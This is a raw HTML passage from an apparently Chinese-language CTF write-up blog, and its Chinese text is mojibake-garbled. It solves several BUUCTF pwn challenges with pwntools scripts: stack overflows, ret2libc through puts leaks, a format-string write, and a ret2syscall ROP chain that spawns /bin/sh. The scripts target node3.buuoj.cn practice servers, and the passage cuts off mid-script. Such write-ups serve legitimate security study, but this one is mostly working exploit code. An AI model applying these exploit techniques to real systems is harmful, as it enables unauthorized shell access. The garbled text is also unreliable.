title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>æµ®ç‚¹æ•°åœ¨å†…å­˜ä¸­çš„å­˜å‚¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">float a &#x3D; 11.28125;</span><br><span class="line">unsigned char* p &#x3D;  (unsigned char*)&amp;a;</span><br><span class="line">printf(&quot;0x%x %x %x %x&quot;,*(p+3),*(p+2),*(p+1),*(p));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("")</span></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29611</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*(<span class="number">0x2c</span>) + <span class="string">"\x00\x80\x34\x41"</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#r &#x3D; remote(&quot;&quot;)</span><br><span class="line">r &#x3D; remote(&quot;node3.buuoj.cn&quot;,29477)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;A&#39;*(0x88) + p64(0x400596)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-c-1ï¼ˆ64ä½çš„putsæ³„éœ²ï¼‰"><a href="#ciscn-2019-c-1ï¼ˆ64ä½çš„putsæ³„éœ²ï¼‰" class="headerlink" title="ciscn_2019_c_1ï¼ˆ64ä½çš„putsæ³„éœ²ï¼‰"></a>ciscn_2019_c_1ï¼ˆ64ä½çš„putsæ³„éœ²ï¼‰</h2><p>æœ¬åœ°å¯ä»¥æ‰“é€š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29957</span>)</span><br><span class="line">p = process(<span class="string">"./pwn3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn3"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">puts_addr = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">encrypt = <span class="number">0x4009a0</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your choice!\n"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_addr)+p64(encrypt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">puts=u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">log.info(<span class="string">"libc base 0x%x"</span>,puts-libc.symbols[<span class="string">'puts'</span>])</span><br><span class="line">libc_base = puts-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">print(next(libc.search(<span class="string">"/bin/sh"</span>)))</span><br><span class="line">payload2=<span class="string">b'A'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å¤ªåºŸç‰©äº†</p><p>åæ¥çœ‹äº†é¢˜è§£åŸæ¥æ˜¯18ä¸Šé¢</p><p>ç”¨libcsearcher</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">'linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line">ru=<span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">rl=<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sl=<span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27415</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3")</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn3"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">puts_plt = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">encrypt = <span class="number">0x4009a0</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)</span><br><span class="line">sla(<span class="string">"Input your choice!\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">ru(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">rl()</span><br><span class="line">rl()</span><br><span class="line">puts = u64(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,puts)</span><br><span class="line">print(libc)</span><br><span class="line">libc_base = puts-libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">log.info(<span class="string">"libc base 0x%x"</span>,libc_base)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload2=<span class="string">b'A'</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">sl(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œéœ€è¦æ³¨æ„</p><p>18çš„ubuntuæ‰§è¡Œsystemä¼šè¿›è¡Œå †æ ˆå¹³è¡¡</p><p>è§£å†³åŠæ³•æ˜¯åŠ retæŒ‡ä»¤</p></blockquote><h2 id="OGeek2019-babyropï¼ˆ32ä½putsæ³„éœ²ï¼‰"><a href="#OGeek2019-babyropï¼ˆ32ä½putsæ³„éœ²ï¼‰" class="headerlink" title="[OGeek2019]babyropï¼ˆ32ä½putsæ³„éœ²ï¼‰"></a>[OGeek2019]babyropï¼ˆ32ä½putsæ³„éœ²ï¼‰</h2><p>æ‰“é€š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru&#x3D;lambda x:p.recvuntil(x)</span><br><span class="line">rl&#x3D;lambda :p.recvline()</span><br><span class="line">sl&#x3D;lambda x:p.sendline(x)</span><br><span class="line">sla&#x3D;lambda x,y:p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">#r &#x3D; remote(&quot;&quot;)</span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29517)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">payload &#x3D; b&#39;\x00&#39;*7 + b&#39;\xff&#39;</span><br><span class="line">main &#x3D; 0x8048825</span><br><span class="line">sl(payload)</span><br><span class="line">puts_plt &#x3D; elf.symbols[&#39;puts&#39;]</span><br><span class="line">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class="line">payload2 &#x3D; b&#39;A&#39;*(0xe7+0x4) + p32(0x08048548) + p32(main) + p32(0x8049fd4)</span><br><span class="line">sla(&quot;Correct\n&quot;,payload2)</span><br><span class="line">puts &#x3D; u32(p.recv(4))</span><br><span class="line">log.info(&quot;libc base 0x%x&quot;,puts-libc.symbols[&#39;puts&#39;])</span><br><span class="line">libc_base &#x3D; puts-libc.symbols[&#39;puts&#39;]</span><br><span class="line">system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class="line">bin_sh_addr &#x3D; libc_base + next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;))</span><br><span class="line">sl(payload)</span><br><span class="line">payload3 &#x3D; b&#39;A&#39;*(0xe7+0x4) + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)</span><br><span class="line">sla(&quot;Correct\n&quot;,payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5ï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼‰"><a href="#ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5ï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼‰" class="headerlink" title="[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5ï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼‰"></a>[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5ï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼‰</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru&#x3D;lambda x:p.recvuntil(x)</span><br><span class="line">rl&#x3D;lambda :p.recvline()</span><br><span class="line">sl&#x3D;lambda x:p.sendline(x)</span><br><span class="line">sla&#x3D;lambda x,y:p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">#r &#x3D; remote(&quot;&quot;)</span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27812)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">payload &#x3D; p32(0x804C044) + &quot;aaaa%10$n&quot;</span><br><span class="line">sl(payload)</span><br><span class="line">#print(p.recv())</span><br><span class="line">sl(b&#39;8&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>ä¸€å¼€å§‹å‡†å¤‡\x00å‘ç°ä¸å¯ä»¥</p><blockquote><p>unsigned __int8:è¡¨ç¤ºæ— ç¬¦å·ä¸€ä¸ªå­—èŠ‚</p><p>é‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥æº¢å‡ºäº†ï¼Œå¯ä»¥çœ‹ä¸‹é¢è¿™ä¸ªeg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">&gt;int main()</span><br><span class="line">&gt;&#123;</span><br><span class="line">char a &#x3D; 0x100;</span><br><span class="line">printf(&quot;%d\n&quot;,a-1);</span><br><span class="line">printf(&quot;%d\n&quot;,a);</span><br><span class="line">printf(&quot;%d&quot;,a+1);</span><br><span class="line">&gt;&#125;</span><br><span class="line">&gt;è¾“å‡ºç»“æœä¸º -1 0 1</span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆä¸­é—´æ˜¯0å‘¢ï¼Ÿ</p><p>å› ä¸ºcharæ˜¯1å­—èŠ‚ï¼Œæœ€å¤§ä¸º0xffä¹Ÿå°±æ˜¯-1ï¼Œ</p><p>ç»§ç»­åŠ +1ï¼Œå°±æ˜¯0x100ï¼Œå·²ç»è¶…è¿‡0xffï¼Œå°±ä¼šä¸¢å¼ƒï¼Œå˜æˆ0</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class="line">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class="line">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class="line">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     &#x3D; lambda                    :p.interactive()</span><br><span class="line">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\0&#39;))</span><br><span class="line">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\0&#39;))</span><br><span class="line">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29806)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;r2t3&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;r2t3&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">ret &#x3D; 0x080483be</span><br><span class="line">main &#x3D; 0x804863b</span><br><span class="line">system &#x3D; 0x804858b</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x15  + p32(system)</span><br><span class="line">payload &#x3D; payload.ljust(260,b&#39;A&#39;)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><blockquote><p>å¥½å®¶ä¼™,è¿™é¢˜çœŸæ˜¯å¼€çœ¼äº†</p></blockquote><p>å…ˆè¯´ç¬¬ä¸€ç§æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class="line">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class="line">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class="line">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     &#x3D; lambda                    :p.interactive()</span><br><span class="line">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\0&#39;))</span><br><span class="line">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\0&#39;))</span><br><span class="line">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26722)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn4&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn4&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">system &#x3D; 0x80489b8</span><br><span class="line">payload &#x3D; &#39;a&#39;*56</span><br><span class="line">payload +&#x3D; p32(0x080489A0) + p32(0x0804E6A0)</span><br><span class="line">payload +&#x3D; p32(0x308CD64F) + p32(0x195719D1)</span><br><span class="line">sleep(0.1)</span><br><span class="line">sl(payload)</span><br><span class="line">print(p.recv())</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œä¸»è¦æ˜¯getsè¿™ä¸ªå‡½æ•°æ²¡æœ‰é€€å‡ºï¼Œæ‰€ä»¥éœ€è¦exitæ¥å¼ºåˆ¶é€€å‡ºï¼Œä¹‹åè¯»flagå°±è¡Œ</p></blockquote><p>ç¬¬äºŒä¸­ é™æ€é“¾æ¥åº”è¯¥æƒ³åˆ°ret2syscall</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">'linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080b91e6</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806fc30</span></span><br><span class="line">int_0x80 = <span class="number">0x0806d7e5</span></span><br><span class="line">read_addr = <span class="number">0x0806E140</span></span><br><span class="line">gets_addr = <span class="number">0x0804F630</span></span><br><span class="line">pop_ebx_ret =  <span class="number">0x080481ad</span>  <span class="comment">#0x080481ad : pop ebx ; ret</span></span><br><span class="line">main_addr = <span class="number">0x08048A20</span></span><br><span class="line">bss_addr = <span class="number">0x080ECD70</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26722</span>)</span><br><span class="line">p = process(<span class="string">"./pwn4"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn4"</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">56</span> + p32(gets_addr) + p32(main_addr) + p32(bss_addr)</span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="string">b"/bin/sh"</span>)</span><br><span class="line">payload2 = <span class="string">b"A"</span>*<span class="number">0x38</span> + p32(pop_eax_ret) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>)  +p32(bss_addr) + p32(int_0x80)</span><br><span class="line">sl(payload2)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>åŸé¢˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span 